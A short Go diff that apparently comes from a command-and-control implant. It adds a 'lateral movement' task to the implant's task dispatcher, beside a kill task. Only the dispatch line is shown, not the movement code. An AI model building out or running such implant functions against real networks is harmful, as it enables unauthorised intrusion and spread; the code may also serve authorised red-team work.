@@ -303,6 +303,9 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 	case protocol.TaskKill:
 		output = []byte("Agent terminating")
 
+	case protocol.TaskLateral:
+		output, err = ExecuteLateralMovement(task.Args)
+
 	default:
 		err = errMissingArgs("unknown task type")
 	}
